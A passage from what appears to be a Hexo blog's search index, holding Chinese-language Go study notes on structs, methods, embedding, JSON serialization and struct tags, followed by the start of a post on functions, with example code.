class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> SetAge(age <span class="type">int8</span>) &#123;</span><br><span class="line">p.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p1 := NewPerson(<span class="string">&quot;IceWindy&quot;</span>, <span class="number">18</span>)</span><br><span class="line">    fmt.Println(p1.age) <span class="comment">// output:18</span></span><br><span class="line">p1.SetAge2(<span class="number">19</span>)</span><br><span class="line">    fmt.Println(p1.age) <span class="comment">// output:18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="什么时候应该使用指针类型接收者">什么时候应该使用指针类型接收者</h4><ol><li>需要修改接收者中的值</li><li>接收者是拷贝代价比较大的大对象</li><li>保证一致性，如果有某个方法使用了指针接收者，那么其他的方法也应该使用指针接收者。</li></ol><h4 id="任意类型添加方法">任意类型添加方法</h4><p>不仅是结构体可以添加方法，在Go语言中，方法的接收者可以是任意类型。</p><p>举个例子，我们基于内置的<code>int</code>类型使用type关键字可以定义新的自定义类型，然后为我们的自定义类型添加方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> NewInt <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i NewInt)</span></span> SayHello() &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Hello NewInt&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**注意：**不能给别的包的类型定义方法</p><h3 id="匿名字段">匿名字段</h3><p>Go语言的结构体允许成员字段在声明时没有字段名只有类型。但并不是代表真正不是没有字段名，而是用类型名作为字段名，因此一个结构体中同类型的匿名字段只能有一个</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> student <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">string</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s1 := student&#123;</span><br><span class="line"><span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(s1.<span class="type">string</span>, s1.<span class="type">string</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套结构体">嵌套结构体</h3><p>一个结构体中可以嵌套包含另一个结构体或结构体指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="type">string</span></span><br><span class="line">age  <span class="type">int8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">person    Person</span><br><span class="line">studentID <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">stu1 := Student&#123;</span><br><span class="line">person: Person&#123;</span><br><span class="line">name: <span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line">age:  <span class="number">18</span>,</span><br><span class="line">&#125;,</span><br><span class="line">studentID: <span class="number">114514</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;stu1=%#v\n&quot;</span>, stu1) <span class="comment">//output: stu1=main.Student&#123;Person:main.Person&#123;name:&quot;IceWindy&quot;, age:18&#125;, studentID:114514&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="嵌套匿名字段">嵌套匿名字段</h4><p>上面嵌套结构体中的Person结构体也可以采用匿名字段的方式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="type">string</span></span><br><span class="line">age  <span class="type">int8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person</span><br><span class="line">studentID <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">stu1 := Student&#123;</span><br><span class="line">Person: Person&#123;</span><br><span class="line">name: <span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line">age:  <span class="number">18</span>,</span><br><span class="line">&#125;,</span><br><span class="line">studentID: <span class="number">114514</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;stu1=%#v\n&quot;</span>, stu1) <span class="comment">//output: stu1=main.Student&#123;Person:main.Person&#123;name:&quot;IceWindy&quot;, age:18&#125;, studentID:114514&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="嵌套结构体的字段名冲突">嵌套结构体的字段名冲突</h4><p>当嵌套结构体内部采用了相同的字段名，我们需要指定具体嵌套结构体的字段名</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Address 地址结构体</span></span><br><span class="line"><span class="keyword">type</span> Address <span class="keyword">struct</span> &#123;</span><br><span class="line">Province   <span class="type">string</span></span><br><span class="line">City       <span class="type">string</span></span><br><span class="line">CreateTime <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Email 邮箱结构体</span></span><br><span class="line"><span class="keyword">type</span> Email <span class="keyword">struct</span> &#123;</span><br><span class="line">Account    <span class="type">string</span></span><br><span class="line">CreateTime <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//User 用户结构体</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Gender <span class="type">string</span></span><br><span class="line">Address</span><br><span class="line">Email</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> user User</span><br><span class="line">user.Name = <span class="string">&quot;IceWindy&quot;</span></span><br><span class="line">user.Gender = <span class="string">&quot;男&quot;</span></span><br><span class="line">user.Address.CreateTime = <span class="string">&quot;1145&quot;</span> </span><br><span class="line">user.Email.CreateTime = <span class="string">&quot;1145&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结构体的-继承">结构体的“继承”</h4><p>使用嵌套结构体的方式，可以实现其他面向对象编程语言中的继承</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Animal 动物</span></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Animal)</span></span> move() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s会动！\n&quot;</span>, a.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Dog 狗</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">    Feet    <span class="type">int8</span></span><br><span class="line">    *Animal <span class="comment">//通过嵌套匿名结构体实现继承</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dog)</span></span> wang() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s会汪汪汪~\n&quot;</span>, d.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    d1 := &amp;Dog&#123;</span><br><span class="line">        Feet: <span class="number">4</span>,</span><br><span class="line">        Animal: &amp;Animal&#123; <span class="comment">//注意嵌套的是结构体指针</span></span><br><span class="line">            name: <span class="string">&quot;乐乐&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    d1.wang() <span class="comment">//乐乐会汪汪汪~</span></span><br><span class="line">    d1.move() <span class="comment">//乐乐会动！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字段的可见性">字段的可见性</h3><p>结构体中字段大写开头表示可公开访问，小写表示私有（仅在定义当前结构体的包中可访问）。</p><h3 id="json序列化">JSON序列化</h3><p>JSON序列化就是将Go语言中的数据（例如结构体实例等）转换为满足JSON格式的数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> student <span class="keyword">struct</span> &#123;</span><br><span class="line">StudentID   <span class="type">int</span></span><br><span class="line">StudentName <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> class <span class="keyword">struct</span> &#123;</span><br><span class="line">ClassName <span class="type">string</span></span><br><span class="line">Student   []student</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Student构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newStudent</span><span class="params">(sID <span class="type">int</span>, sName <span class="type">string</span>)</span></span> student &#123;</span><br><span class="line"><span class="keyword">return</span> student&#123;</span><br><span class="line">StudentID:   sID,</span><br><span class="line">StudentName: sName,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//结构体内需要首字母大写，即对外包开放</span></span><br><span class="line">    <span class="comment">//无首字母大写的字段无法被JSON包访问</span></span><br><span class="line">c1 := class&#123;</span><br><span class="line">ClassName: <span class="string">&quot;101班&quot;</span>,</span><br><span class="line"><span class="comment">//切片需要初始化</span></span><br><span class="line">Student: <span class="built_in">make</span>([]student, <span class="number">0</span>, <span class="number">20</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">tempStu := newStudent(i, fmt.Sprintf(<span class="string">&quot;Stu%02d&quot;</span>, i))</span><br><span class="line">c1.Student = <span class="built_in">append</span>(c1.Student, tempStu)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, c1)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%#v\n&quot;</span>, c1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//JSON序列化</span></span><br><span class="line">data, err := json.Marshal(c1) </span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;JSON序列化失败&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, data)  <span class="comment">//output:[]uint8，即[]byte</span></span><br><span class="line">fmt.Println(<span class="type">string</span>(data)) <span class="comment">//为了便于打印，需要转换为string</span></span><br><span class="line"><span class="comment">/* 经过格式化之后的结果（略作缩进）</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;ClassName&quot;:&quot;101班&quot;,</span></span><br><span class="line"><span class="comment">    &quot;Student&quot;:[</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:0,&quot;StudentName&quot;:&quot;Stu00&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:1,&quot;StudentName&quot;:&quot;Stu01&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:2,&quot;StudentName&quot;:&quot;Stu2&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:3,&quot;StudentName&quot;:&quot;Stu03&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:4,&quot;StudentName&quot;:&quot;Stu04&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:5,&quot;StudentName&quot;:&quot;Stu05&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:6,&quot;StudentName&quot;:&quot;Stu06&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:7,&quot;StudentName&quot;:&quot;Stu07&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:8,&quot;StudentName&quot;:&quot;Stu08&quot;&#125;,</span></span><br><span class="line"><span class="comment">        &#123;&quot;StudentID&quot;:9,&quot;StudentName&quot;:&quot;Stu09&quot;&#125;</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JSON反序列化:JSON字符串转换为Go语言的类型</span></span><br><span class="line">jsonStu := <span class="string">&quot;&#123;\&quot;ClassName\&quot;:\&quot;101班\&quot;,\&quot;Student\&quot;:[&#123;\&quot;StudentID\&quot;:0,\&quot;StudentName\&quot;:\&quot;Stu00\&quot;&#125;,&#123;\&quot;StudentID\&quot;:1,\&quot;StudentName\&quot;:\&quot;Stu01\&quot;&#125;]&#125;&quot;</span></span><br><span class="line">c2 := class&#123;&#125;</span><br><span class="line">    <span class="comment">//传入一个结构体指针使得可以修改结构体的内容</span></span><br><span class="line">err = json.Unmarshal([]<span class="type">byte</span>(jsonStu), &amp;c2) </span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;反序列化失败&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%#v\n&quot;</span>, c2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体标签-tag">结构体标签(Tag)</h3><p><code>Tag</code>是结构体的元信息，可以在运行的时候通过反射的机制读取出来。 <code>Tag</code>在结构体字段的后方定义，由一对<strong>反引号</strong>包裹起来</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`key1:&quot;value1&quot; key2:&quot;value2&quot;`</span></span><br></pre></td></tr></table></figure><p>结构体tag由一个或多个键值对组成。键与值使用冒号分隔，值用双引号括起来。同一个结构体字段可以设置多个键值对tag，不同的键值对之间<strong>使用空格分隔</strong>，因此不要在键值之间使用空格分隔。</p><p>以下以json tag修改序列化后key的名称为例子展示Tag的作用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Stu <span class="keyword">struct</span> &#123;</span><br><span class="line">ID    <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span> <span class="comment">//通过json tag实现json序列化时得到与默认字段名不同的key</span></span><br><span class="line">Name  <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Class <span class="type">string</span> <span class="comment">//默认使用字段名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s1 := Stu&#123;</span><br><span class="line">ID:    <span class="number">1</span>,</span><br><span class="line">Name:  <span class="string">&quot;IceWindy&quot;</span>,</span><br><span class="line">Class: <span class="string">&quot;101班&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">data, err := json.Marshal(s1)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;json marshal failed!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data) <span class="comment">//output:&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;IceWindy&quot;,&quot;Class&quot;:&quot;101班&quot;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（5）：函数</title>
      <link href="/2023/01/31/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%EF%BC%9A%E5%87%BD%E6%95%B0/"/>
      <url>/2023/01/31/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%EF%BC%9A%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="函数">函数</h2><p>Go语言中支持函数、匿名函数和闭包。</p><p>函数在Go语言中可以作为变量、参数、返回值等等。</p><h3 id="定义">定义</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> 函数名<span class="params">([参数列表])</span></span> [返回值列表] &#123;</span><br><span class="line">函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回值">返回值</h3><p>一个函数可以有0个或者多个返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在返回值列表定义返回变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a, b <span class="type">int</span>)</span></span> (c <span class="type">int</span>)&#123;</span><br><span class="line">    c = a+b</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">//这样做，在return处就只需要一个return即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多返回值，求商与余数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">divi</span><span class="params">(a, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a/b, a%b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用有返回值的函数时，我们可以选择不接受它的返回值。</p><p>当我们一个函数返回值为silce时，nil可以看做是一个silce，直接返回nil即可，不需要返回一个<code>[]int&#123;&#125;</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">nilFunc</span><span class="params">()</span></span> []<span class="type">int</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="comment">//不需要返回[]int&#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参数">参数</h3><p><strong>可变参数</strong></p><p>可变参数是指函数的参数数量不固定。Go语言中的可变参数通过在参数类型前加<code>...</code>来标识。</p><p>注意：可变参数一般放在函数参数最后面。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ret := sum(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line">    fmt.Println(ret) <span class="comment">//output:60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(x ...<span class="type">int</span>)</span></span> (sum <span class="type">int</span>) &#123;</span><br><span class="line">    fmt.Println(x) <span class="comment">//output:[10 20 30]</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> x &#123;</span><br><span class="line">sum = sum + v</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从输出的结果可以看出，可变参数x在函数体内被是视作一个int类型的切片;</p><p>但是在函数体外，可变参数不能被视作一个切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(...<span class="type">int</span>)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f2</span><span class="params">([]<span class="type">int</span>)</span></span>&#123;&#125;</span><br><span class="line">fmt.Println(f1) <span class="comment">//output:func(...int)</span></span><br><span class="line">fmt.Println(f2) <span class="comment">//output:func([]int)</span></span><br></pre></td></tr></table></figure><p>可以看出，两种参数输出的结果是不一样的，因此我们不能直接将切片作为参数传入函数。</p><p>如果我们需要将切片传入一个可变参数的函数中，我们则需要将切片拆解为参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">fmt.Println(sum(values...)) <span class="comment">//output:10</span></span><br></pre></td></tr></table></figure><h2 id="函数进阶">函数进阶</h2><h3 id="变量作用域">变量作用域</h3><h4 id="全局变量">全局变量</h4><p>全局变量是定义在函数外部的变量，它在程序整个运行周期内都有效。 在函数中可以访问到全局变量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num <span class="type">int</span> = <span class="number">10</span> <span class="comment">//定义全局变量num</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testGlobalVar</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(num) <span class="comment">//函数中可以访问全局变量num</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="局部变量">局部变量</h4><p>局部变量就是仅在自己的代码块中可用的变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">localVar</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">100</span> <span class="comment">//定义一个函数局部变量x,仅在该函数内生效</span></span><br><span class="line">fmt.Println(x)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span> &#123;</span><br><span class="line">        y := <span class="number">10</span></span><br><span class="line">        fmt.Println(y)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fmt.Println(y) 此时无法使用变量y</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">localVar()</span><br><span class="line"><span class="comment">//fmt.Println(x) 此时无法使用变量x</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数类型与变量">函数类型与变量</h3><h4 id="定义函数类型">定义函数类型</h4><p>使用<code>type</code>关键字可以定义一个函数类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> calcFuncType <span class="function"><span class="keyword">func</span><span 